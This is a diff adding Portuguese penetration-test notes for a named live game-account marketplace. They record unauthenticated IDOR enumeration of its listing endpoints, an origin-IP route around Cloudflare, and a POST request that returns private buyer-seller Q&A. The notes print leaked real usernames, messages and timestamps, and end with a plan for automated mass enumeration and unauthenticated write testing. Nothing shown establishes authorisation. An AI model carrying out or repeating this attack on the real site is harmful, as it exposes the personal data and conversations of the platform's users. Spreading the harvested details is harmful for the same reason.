@@ -1,0 +1,73 @@
+# idor_test.txt — Teste de IDOR em /anuncio/ (video + perguntas + detalhe)
+# Engagement: desapegogames.com.br | enum phase | 2026-09-04
+# Bypass CF: https://186.226.60.54 + Host: desapegogames.com.br
+# Todos os testes SEM autenticação (cookie ci_session não-set / anônimo).
+
+## ============================================================
+## 1) /anuncio/video.html?anuncio=<ID>  (GET) — IDOR INFO DISCLOSURE
+## ============================================================
+# Endpoint público (sem auth). Player YouTube. Vaza título + categoria do anúncio por ID sequencial.
+
+| anuncio= | HTTP | Size  | Título (vaza categoria+título) |
+|----------|------|-------|--------------------------------|
+| 1        | 200  | 8489  | Vídeo do LOL > CONTA PRATA 3 COM TODOS OS CHAMPS E 85 SKINS + 15 CROMAS |
+| 2        | 200  | 8485  | (real) |
+| 3        | 200  | 8457  | (real) |
+| 100      | 200  | 8463  | (real) |
+| 1000     | 200  | 8443  | (real) |
+| 169676   | 200  | 8482  | (real) |
+| 351180   | 200  | 8504  | Vídeo do eFootball > [ANDROID/IOS] Conta eFootball 10000 Coins... |
+| 351451   | 200  | 8508  | Vídeo do Free Fire > CONTA DE FF TOP COM 460 PEITAS... |
+| 352000+  | 200  | 8409  | Título VAZIO "Vídeo do  > " (anúncio inexistente) |
+| 700000   | 200  | 8409  | (inexistente) |
+
+# videoId (YouTube) = '' para todos testados (vídeos removidos/empty). Página carrega YT IFrame API.
+# Canonical: <link rel="canonical" href="https://desapegogames.com.br/anuncio/video.html?anuncio=1">
+# Impacto: info disclosure de título+categoria p/ TODOS os ~351.451 anúncios por enumeração sequencial (sem auth).
+# Severidade: BAIXA-MÉDIA (título é semi-público). Valor maior: confirma IDs sequenciais + scope do IDOR.
+
+## ============================================================
+## 2) /anuncio/perguntas.html?anuncio=<ID>  (POST) — IDOR CRÍTICO (Q&A leak)
+## ============================================================
+# POST data=anuncio=<ID>. SEM auth. Vaza conversa Q&A comprador-vendedor completa.
+
+| anuncio= | método | Size  | Conteúdo |
+|----------|--------|-------|----------|
+| (none)   | GET    | 73    | "Você não tem autorização para visualizar as perguntas desse anúncio." |
+| (none)   | POST   | 73    | (mesma msg — sem anuncio) |
+| 1        | POST   | 73    | sem perguntas (anúncio antigo) |
+| 1000     | POST   | 0     | erro/empty |
+| 169676   | POST   | 2813  | Q&A REAL (timestamps 10/01/2024) |
+| 256279   | POST   | 1864  | Q&A REAL |
+| 309843   | POST   | 5311  | Q&A REAL (timestamps 01/09/2026, 19/08/2026...) |
+| 347246   | POST   | 5292  | Q&A REAL |
+| 351260   | POST   | 5152  | Q&A REAL |
+
+### Dados vazados por anúncio (exemplo anuncio=309843):
+- Username + display name do questionador: akaiig/Gomes, bigaz/Bigaz, fogss/fogaça
+- Texto da pergunta: "entrega automatica?", "opa mano, por acaso teria uma conta com skin deus rei darius",
+  "porque diz que é 15.99 quando clica vai pra 30?"
+- Username + display name do vendedor: contaslol/"Contas League Of Legends"
+- Avatar do vendedor: /assets/site/imagens/usuarios/e0f92a5089d4cec1ff6b34a528b020d4.png (MD5)
+- Respostas do vendedor: "Sim!", "Não sei, vai na sorte as contas", "Acho que você está vendo errado..."
+- Timestamps precisos: 01/09/2026 20:27:56, 02/09/2026 07:52:22, etc.
+
+# Impacto: IDOR/Broken Access Control (OWASP A01:2021). Qualquer anônimo lê Q&A privado de
+# qualquer anúncio (1..351451) enumerando IDs sequenciais. Vaza usernames (-> perfil PII),
+# timestamps, negociações, possíveis contatos/negociação de preço.
+# Auth bypass: GET diz "sem autorização" mas POST renderiza o conteúdo -> check de auth inconsistente.
+# Severidade: ALTA (PII de compradores/vendedores, escala ~351k anúncios).
+
+## ============================================================
+## 3) /anuncio/<ID>/<slug>  (GET) — detalhe público (não-IDOR, mas expõe vendedor)
+## ============================================================
+# /anuncio/351180/<slug> -> 200 (145884B). Expõe:
+# - vendedor: /perfil/rdhking  (username do vendedor)
+# - preço (R$ 24,90...), categoria, descrição
+# - AJAX: /anuncio/perguntas.html, /carrinho/adicionar/351180
+# - form: link, quantidade
+# Labels Telefone/WhatsApp/email presentes mas VALORES não expostos no HTML público (só após login/compra).
+
+## ============================================================
+## Scope IDOR: anúncios IDs 1 .. ~351451 (sequenciais). Sem auth em video.html e perguntas.html.
+## Próximo passo (webapp): automação de enumeração + teste de escrita (POST de pergunta/resposta sem auth?).
